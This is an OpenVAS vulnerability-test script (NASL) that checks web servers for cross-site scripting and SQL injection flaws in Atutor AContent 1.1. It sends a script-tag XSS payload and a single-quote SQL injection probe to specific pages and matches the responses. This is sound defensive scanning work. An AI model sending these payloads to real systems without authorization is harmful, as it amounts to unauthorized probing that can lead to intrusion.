###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_atutor_acontent_mult_sql_inj_n_xss_vuln.nasl 13551 2019-02-09 10:59:55Z cfischer $
#
# Atutor AContent Multiple SQL Injection and XSS Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801985");
  script_version("$Revision: 13551 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-09 11:59:55 +0100 (Sat, 09 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-09-14 16:05:49 +0200 (Wed, 14 Sep 2011)");
  script_bugtraq_id(49066);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Atutor AContent Multiple SQL Injection and XSS Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17629/");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103761/ZSL-2011-5033.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103760/ZSL-2011-5032.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103759/ZSL-2011-5031.txt");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to execute arbitrary
  script code or to compromise the application, access or modify data, or exploit
  latent vulnerabilities in the underlying database.");

  script_tag(name:"affected", value:"Atutor AContent version 1.1 (build r296).");

  script_tag(name:"insight", value:"Multiple flaws are due to an,

  - Input passed via multiple parameters in multiple scripts is not properly
  sanitised before being used in SQL queries.

  - Input passed via multiple parameters in multiple scripts via GET and POST
  method is not properly sanitised before being used.");

  script_tag(name:"solution", value:"Upgrade to Atutor AContent version 1.2 or later.");

  script_tag(name:"summary", value:"This host is running Atutor AContent and is prone to multiple
  cross site scripting and SQL injection vulnerabilities.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://www.atutor.ca");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if(!can_host_php(port:port))
  exit(0);

foreach dir (make_list_unique("/", "/AContent", cgi_dirs(port:port))) {

  if(dir == "/") dir = "";
  url = dir + "/home/index.php";
  res = http_get_cache(item:url, port:port);

  if(res && ">AContent Handbook<" >< res && '>AContent</' >< res) {

    url = dir + '/documentation/frame_header.php?p="><script>alert(document.cookie)</script>';
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && '"><script>alert(document.cookie)</script>' >< res) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }

    url = dir + "/documentation/search.php?p=home&query='111&search=Search";
    req = http_get(item:url, port:port);
    res = http_keepalive_send_recv(port:port, data:req);

    if('You have an error in your SQL syntax;' >< res) {
      report = report_vuln_url(port:port, url:url);
      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit(99);